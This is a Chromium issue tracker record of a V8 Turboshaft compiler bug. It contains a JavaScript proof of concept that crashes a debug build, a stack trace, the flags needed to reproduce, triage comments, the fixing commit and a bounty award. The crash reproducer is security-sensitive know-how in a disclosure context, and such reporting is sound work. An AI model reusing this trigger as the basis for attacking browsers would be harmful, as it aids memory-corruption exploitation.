# Security: Debug check failed: !IsBound() || (Predecessors().size() == 1 && kind_ == Kind::kLoopHeader).

| Field | Value |
|-------|-------|
| **Issue ID** | [40062646](https://issues.chromium.org/issues/40062646) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P4 |
| **Component** | Blink>JavaScript>Compiler>Turbofan |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | wh...@gmail.com |
| **Assignee** | ni...@chromium.org |
| **Created** | 2023-01-14 |
| **Bounty** | $7,000.00 |

## Description

**This template is ONLY for reporting security bugs. If you are reporting a**  

**Download Protection Bypass bug, please use the "Security - Download**  

**Protection" template. For all other reports, please use a different**  

**template.**

**Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com>**  

**/chromium/src/+/HEAD/docs/security/faq.md**

**Please see the following link for instructions on filing security bugs:**  

**<https://www.chromium.org/Home/chromium-security/reporting-security-bugs>**

**Reports may be eligible for reward payments under the Chrome VRP:**  

**<http://g.co/ChromeBugRewards>**

**NOTE: Security bugs are normally made public once a fix has been widely**  

**deployed.**

**-------------------------**

v8 current HEAD

PoC  

function main() {  

try {  

for (let v0 = 0; v0 < 1395; v0++) {  

for (let v3 = v0; v3 < 4; v3 = v3 + -4294967296) {  

function v4(v5,...v6) {  

return 4;  

}  

}  

const v7 = v0--;  

for (let v8 = 0; v8 < 3818; v8++) {  

function v9(v10,v11,v12,v13) {  

const v14 = v8 instanceof v11;  

return v7;  

}  

v8 >>>= v8;  

}  

}  

} catch(v15) {  

}  

}  

main();

# 

# Fatal error in ../../src/compiler/turboshaft/graph.h, line 458

# Debug check failed: !IsBound() || (Predecessors().size() == 1 && kind\_ == Kind::kLoopHeader).

# 

# 

# 

#FailureMessage Object: 0x7ffe9b711ef8  

==== C stack trace ===============================

```
/home/uuu/v8_src.main/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7ff5d100a1de]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8_libplatform.so(+0x4b2bd) [0x7ff5d0f5e2bd]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const\*, int, char const\*, ...)+0x1ac) [0x7ff5d0fd85dc]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8_libbase.so(+0x5802c) [0x7ff5d0fd802c]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8_libbase.so(V8_Dcheck(char const\*, int, char const\*)+0x27) [0x7ff5d0fd8697]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::compiler::turboshaft::Block::AddPredecessor(v8::internal::compiler::turboshaft::Block\*)+0xfa) [0x7ff5d61b066a]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::compiler::turboshaft::Assembler<v8::internal::compiler::turboshaft::DeadCodeEliminationReducer>::AddPredecessor(v8::internal::compiler::turboshaft::Block\*, v8::internal::compiler::turboshaft::Block\*, bool)+0x2fc) [0x7ff5d630a74c]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::compiler::turboshaft::ReducerBase<v8::internal::compiler::turboshaft::ReducerStack<v8::internal::compiler::turboshaft::Assembler<v8::internal::compiler::turboshaft::DeadCodeEliminationReducer>>>::ReduceGoto(v8::internal::compiler::turboshaft::Block\*)+0x6b) [0x7ff5d630a1ab]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::compiler::turboshaft::GraphVisitor<v8::internal::compiler::turboshaft::Assembler<v8::internal::compiler::turboshaft::DeadCodeEliminationReducer>>::VisitBranch(v8::internal::compiler::turboshaft::BranchOp const&)+0xe8) [0x7ff5d6306b68]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(bool v8::internal::compiler::turboshaft::GraphVisitor<v8::internal::compiler::turboshaft::Assembler<v8::internal::compiler::turboshaft::DeadCodeEliminationReducer>>::VisitOp<false>(v8::internal::compiler::turboshaft::OpIndex, v8::internal::compiler::turboshaft::Block const\*)+0x13aa) [0x7ff5d630f88a]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(void v8::internal::compiler::turboshaft::GraphVisitor<v8::internal::compiler::turboshaft::Assembler<v8::internal::compiler::turboshaft::DeadCodeEliminationReducer>>::VisitBlock<false>(v8::internal::compiler::turboshaft::Block const\*)+0x374) [0x7ff5d630e4b4]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(void v8::internal::compiler::turboshaft::GraphVisitor<v8::internal::compiler::turboshaft::Assembler<v8::internal::compiler::turboshaft::DeadCodeEliminationReducer>>::VisitAllBlocks<false>()+0xeb) [0x7ff5d630e0ab]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(void v8::internal::compiler::turboshaft::GraphVisitor<v8::internal::compiler::turboshaft::Assembler<v8::internal::compiler::turboshaft::DeadCodeEliminationReducer>>::VisitGraph<false>()+0x375) [0x7ff5d6301665]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::compiler::turboshaft::OptimizationPhaseImpl<v8::internal::compiler::turboshaft::DeadCodeEliminationReducer>::Run(v8::internal::compiler::turboshaft::Graph\*, v8::internal::Zone\*, v8::internal::compiler::NodeOriginTable\*, std::Cr::tuple<> const&)+0xa4) [0x7ff5d62e55f4]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::compiler::turboshaft::OptimizationPhase<v8::internal::compiler::turboshaft::DeadCodeEliminationReducer>::Run(v8::internal::Isolate\*, v8::internal::compiler::turboshaft::Graph\*, v8::internal::Zone\*, v8::internal::compiler::NodeOriginTable\*, std::Cr::tuple<> const&)+0x90) [0x7ff5d62e5400]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::compiler::TurboshaftDeadCodeEliminationPhase::Run(v8::internal::compiler::PipelineData\*, v8::internal::Zone\*)+0x90) [0x7ff5d62e5360]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(auto v8::internal::compiler::PipelineImpl::Run<v8::internal::compiler::TurboshaftDeadCodeEliminationPhase>()+0xae) [0x7ff5d611f18e]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::compiler::PipelineImpl::OptimizeGraph(v8::internal::compiler::Linkage\*)+0x6ff) [0x7ff5d6110faf]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::compiler::PipelineCompilationJob::ExecuteJobImpl(v8::internal::RuntimeCallStats\*, v8::internal::LocalIsolate\*)+0xe3) [0x7ff5d6110643]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::OptimizedCompilationJob::ExecuteJob(v8::internal::RuntimeCallStats\*, v8::internal::LocalIsolate\*)+0x14c) [0x7ff5d41984ec]  
/home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(+0x31917f4) [0x7ff5d41b07f4]  

```

## Timeline

### [Deleted User] (2023-01-14)

[Empty comment from Monorail migration]

### wh...@gmail.com (2023-01-14)

ok, please using this flag, 
--assert-types --turboshaft-assert-types --turboshaft --always-turbofan


### bo...@google.com (2023-01-17)

Confirming repro on Linux at 111.0.5545.0 (tip of tree) but does NOT repro on Linux Dev 111.0.5532.2, so this is likely to be a fresh bug. 

Setting all platforms (except iOS) since this seems like to be core v8 behavior. 

Severity-High to do expectation of memory corruption in sandboxed renderer process in non-debug builds. 

[Monorail components: Blink>JavaScript>Compiler>Turbofan]

### [Deleted User] (2023-01-17)

[Empty comment from Monorail migration]

### [Deleted User] (2023-01-18)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-01-18)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-01-18)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bo...@google.com (2023-01-18)

Ah, sorry. Setting security impact to none since reaching this bug requires non-standard flags.

@wh0tlif3 - if you're aware of a way to trigger the bug without the flags listed in https://crbug.com/chromium/1407338#c2 then please let us know. 

### ni...@chromium.org (2023-01-26)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2023-01-26)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/7f756058ab53862d841d5398342721617d2386f4

commit 7f756058ab53862d841d5398342721617d2386f4
Author: Nico Hartmann <nicohartmann@chromium.org>
Date: Thu Jan 26 13:29:13 2023

[turboshaft] Fix incorrect jumps into loops in Turboshaft's DCE

Bug: v8:12783
Fixed: chromium:1407342, chromium:1407338
Change-Id: I5081e6f45af36729b8fc8c01e952932c39be9a2c
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4197347
Reviewed-by: Darius Mercadier <dmercadier@chromium.org>
Commit-Queue: Nico Hartmann <nicohartmann@chromium.org>
Auto-Submit: Nico Hartmann <nicohartmann@chromium.org>
Cr-Commit-Position: refs/heads/main@{#85499}

[modify] https://crrev.com/7f756058ab53862d841d5398342721617d2386f4/src/compiler/turboshaft/dead-code-elimination-reducer.h
[modify] https://crrev.com/7f756058ab53862d841d5398342721617d2386f4/src/compiler/turboshaft/optimization-phase.h


### rs...@chromium.org (2023-01-26)

[Empty comment from Monorail migration]

### [Deleted User] (2023-01-27)

[Empty comment from Monorail migration]

### [Deleted User] (2023-01-27)

[Empty comment from Monorail migration]

### am...@google.com (2023-02-03)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-02-03)

Congratulations! The VRP Panel has decided to award you $7,000 for this report. Thank you for your efforts and reporting this issue to us -- nice work! 

### am...@google.com (2023-02-04)

[Empty comment from Monorail migration]

### [Deleted User] (2023-05-05)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1407338?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/1410426]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40062646)*
